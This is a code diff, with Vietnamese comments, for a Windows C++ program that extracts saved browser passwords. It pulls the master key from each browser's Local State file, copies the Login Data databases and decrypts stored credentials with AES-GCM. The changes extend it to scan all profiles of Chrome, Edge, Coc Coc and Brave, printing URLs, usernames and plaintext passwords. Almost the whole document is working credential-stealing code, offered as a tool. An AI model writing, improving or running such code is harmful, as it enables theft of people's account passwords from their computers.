@@ -7,25 +7,27 @@
 #include <windows.h>
 #include <dpapi.h>
 #include <shlobj.h>
-#include <bcrypt.h> // Thư viện mã hóa
+#include <bcrypt.h>
 
-// Thư viện ngoài (đã add vào project)
+// Thư viện ngoài
 #include "json.hpp"
 #include "sqlite3.h"
 
-// Link thư viện hệ thống
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "shlwapi.lib")
 #pragma comment(lib, "bcrypt.lib")
 
 using json = nlohmann::json;
-using namespace std; // QUAN TRỌNG: Phải đặt dòng này trước khi dùng vector
+using namespace std;
+
+// --- CẤU TRÚC ĐỂ QUẢN LÝ NHIỀU TRÌNH DUYỆT ---
+struct BrowserTarget {
+    string name;
+    string pathSuffix;
+};
 
 // --- HÀM 1: GIẢI MÃ BASE64 ---
-static const string base64_chars =
-"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-"abcdefghijklmnopqrstuvwxyz"
-"0123456789+/";
+static const string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 vector<BYTE> Base64Decode(string const& encoded_string) {
     int in_len = encoded_string.size();
@@ -55,13 +57,12 @@ vector<BYTE> Base64Decode(string const& encoded_string) {
     return ret;
 }
 
-// --- HÀM 2: GIẢI MÃ AES-GCM (Sửa lỗi goto & đặt đúng chỗ) ---
+// --- HÀM 2: GIẢI MÃ AES-GCM ---
 vector<BYTE> AES_GCM_Decrypt(const vector<BYTE>& key, const vector<BYTE>& iv, const vector<BYTE>& ciphertext, const vector<BYTE>& authTag) {
     BCRYPT_ALG_HANDLE hAlg = NULL;
     BCRYPT_KEY_HANDLE hKey = NULL;
     vector<BYTE> plaintext;
     NTSTATUS status = 0;
-
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
     ULONG resultLen = 0;
 
@@ -76,7 +77,6 @@ vector<BYTE> AES_GCM_Decrypt(const vector<BYTE>& key, const vector<BYTE>& iv, co
     authInfo.cbTag = (ULONG)authTag.size();
 
     plaintext.resize(ciphertext.size());
-
     status = BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, NULL, 0, plaintext.data(), (ULONG)plaintext.size(), &resultLen, 0);
 
     if (status != 0) plaintext.clear();
@@ -89,12 +89,8 @@ cleanup:
 }
 
 // --- HÀM 3: LẤY MASTER KEY ---
-vector<BYTE> GetMasterKey() {
-    char path[MAX_PATH];
-    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path) != S_OK) return {};
-
-    string keyPath = string(path) + "\\Microsoft\\Edge\\User Data\\Local State";
-    ifstream f(keyPath);
+vector<BYTE> GetMasterKey(string localStatePath) {
+    ifstream f(localStatePath);
     if (!f.is_open()) return {};
 
     try {
@@ -117,18 +113,12 @@ vector<BYTE> GetMasterKey() {
     return {};
 }
 
-// --- HÀM 4: ĐỌC DỮ LIỆU (Đã tối ưu) ---
-void ReadDB(const vector<BYTE>& masterKey) {
-    char path[MAX_PATH];
-    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);
+// --- HÀM 4: ĐỌC DỮ LIỆU TỪ 1 FILE DB CỤ THỂ ---
+void ReadDB(string dbPath, const vector<BYTE>& masterKey) {
+    string tempDb = "Temp_" + to_string(rand()) + ".db";
 
-    string originalDb = string(path) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
-    string tempDb = "TempLogin.db";
-
-    if (CopyFileA(originalDb.c_str(), tempDb.c_str(), FALSE) == 0) {
-        cout << "[!] Khong copy duoc DB.\n";
-        return;
-    }
+    // Copy file để tránh bị lock
+    if (CopyFileA(dbPath.c_str(), tempDb.c_str(), FALSE) == 0) return;
 
     sqlite3* db;
     if (sqlite3_open(tempDb.c_str(), &db) == SQLITE_OK) {
@@ -136,39 +126,42 @@ void ReadDB(const vector<BYTE>& masterKey) {
         sqlite3_stmt* stmt;
 
         if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
-            cout << "\n=== KET QUA ===\n";
             while (sqlite3_step(stmt) == SQLITE_ROW) {
                 const char* url = (const char*)sqlite3_column_text(stmt, 0);
                 const char* user = (const char*)sqlite3_column_text(stmt, 1);
                 const void* passBlob = sqlite3_column_blob(stmt, 2);
                 int passLen = sqlite3_column_bytes(stmt, 2);
 
-                if (user && strlen(user) > 0) {
-                    cout << "URL:  " << url << endl;
-                    cout << "User: " << user << endl;
+                if (user && strlen(user) > 0 && passLen >= 31) {
+                    cout << "   [+] URL:  " << url << "\n";
+                    cout << "   [+] User: " << user << "\n";
 
-                    // FIX LỖI CRASH: Chỉ giải mã nếu đủ độ dài
-                    if (passLen >= 31) {
-                        vector<BYTE> buff((BYTE*)passBlob, (BYTE*)passBlob + passLen);
-                        if (buff[0] == 'v' && buff[1] == '1') {
-                            vector<BYTE> iv(buff.begin() + 3, buff.begin() + 15);
-                            vector<BYTE> ciphertext(buff.begin() + 15, buff.end() - 16);
-                            vector<BYTE> authTag(buff.end() - 16, buff.end());
+                    vector<BYTE> buff((BYTE*)passBlob, (BYTE*)passBlob + passLen);
 
-                            vector<BYTE> decrypted = AES_GCM_Decrypt(masterKey, iv, ciphertext, authTag);
-                            if (!decrypted.empty()) {
-                                string passStr(decrypted.begin(), decrypted.end());
-                                cout << "Pass: " << passStr << endl;
-                            }
-                            else {
-                                cout << "Pass: (Loi giai ma)" << endl;
-                            }
+                    // In ra để xem đầu file nó là chữ gì (Debug)
+                    cout << "   [?] Header: " << (char)buff[0] << (char)buff[1] << (char)buff[2] << "\n";
+
+                    // Ép giải mã luôn (Giả sử vẫn là v10/v20 có cấu trúc tương tự)
+                    try {
+                        // Header 3 byte + IV 12 byte = 15 byte đầu
+                        vector<BYTE> iv(buff.begin() + 3, buff.begin() + 15);
+                        vector<BYTE> ciphertext(buff.begin() + 15, buff.end() - 16);
+                        vector<BYTE> authTag(buff.end() - 16, buff.end());
+
+                        vector<BYTE> decrypted = AES_GCM_Decrypt(masterKey, iv, ciphertext, authTag);
+
+                        if (!decrypted.empty()) {
+                            string passStr(decrypted.begin(), decrypted.end());
+                            cout << "   [=] PASS: " << passStr << "\n";
+                        }
+                        else {
+                            cout << "   [!] PASS: (Giai ma THAT BAI)\n";
                         }
                     }
-                    else {
-                        cout << "Pass: (Trong/Ngan)" << endl;
+                    catch (...) {
+                        cout << "   [!] Loi cau truc du lieu\n";
                     }
-                    cout << "--------------------\n";
+                    cout << "   --------------------------------\n";
                 }
             }
         }
@@ -178,18 +171,76 @@ void ReadDB(const vector<BYTE>& masterKey) {
     DeleteFileA(tempDb.c_str());
 }
 
+// --- HÀM 5: TỰ ĐỘNG QUÉT TẤT CẢ PROFILE (MỚI) ---
+void ScanAllProfiles(string userDataPath, const vector<BYTE>& masterKey) {
+    string searchPath = userDataPath + "\\*"; // Quét tất cả thư mục
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
+
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                string folderName = fd.cFileName;
+
+                // Bỏ qua thư mục . và ..
+                if (folderName == "." || folderName == "..") continue;
+
+                // Logic: Tìm thư mục "Default" HOẶC các thư mục bắt đầu bằng chữ "Profile"
+                // (Ví dụ: Profile 1, Profile 2...)
+                if (folderName == "Default" || folderName.find("Profile") == 0) {
+
+                    // Tạo đường dẫn đến file Login Data của Profile đó
+                    string dbPath = userDataPath + "\\" + folderName + "\\Login Data";
+
+                    // Kiểm tra xem file Login Data có tồn tại không
+                    if (GetFileAttributesA(dbPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+                        cout << "    >>> Dang quet Profile: " << folderName << " <<<\n";
+                        ReadDB(dbPath, masterKey);
+                    }
+                }
+            }
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
+}
+
 int main() {
-    cout << "--- TOOL C++ ALL-IN-ONE ---\n";
-    vector<BYTE> key = GetMasterKey();
+    // SetConsoleOutputCP(65001); // Uncomment nếu muốn hiện tiếng Việt có dấu
+    cout << "==========================================\n";
+    cout << "   TOOL SCAN ALL PROFILES C++ (FINAL)     \n";
+    cout << "==========================================\n\n";
 
-    if (!key.empty()) {
-        cout << "[+] Master Key OK.\n";
-        ReadDB(key);
-    }
-    else {
-        cout << "[!] Khong lay duoc Key.\n";
+    char appDataPath[MAX_PATH];
+    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
+    string basePath(appDataPath);
+
+    vector<BrowserTarget> targets = {
+        {"Google Chrome", "\\Google\\Chrome\\User Data"},
+        {"Microsoft Edge", "\\Microsoft\\Edge\\User Data"},
+        {"Coc Coc",       "\\CocCoc\\Browser\\User Data"},
+        {"Brave Browser", "\\BraveSoftware\\Brave-Browser\\User Data"}
+    };
+
+    for (const auto& browser : targets) {
+        cout << "[*] TRINH DUYET: " << browser.name << "...\n";
+
+        // 1. Lấy Master Key (Dùng chung cho cả trình duyệt)
+        string keyPath = basePath + browser.pathSuffix + "\\Local State";
+        vector<BYTE> key = GetMasterKey(keyPath);
+
+        if (key.empty()) {
+            cout << "    -> Khong cai dat.\n\n";
+            continue;
+        }
+
+        // 2. Gọi hàm quét thông minh (Scan All Profiles)
+        string userDataPath = basePath + browser.pathSuffix;
+        ScanAllProfiles(userDataPath, key);
+
+        cout << "\n";
     }
 
-    system("pause");
+    cout << "DA QUET XONG! Nhan phim bat ky de thoat...\n";
+    system("pause > nul");
     return 0;
 }
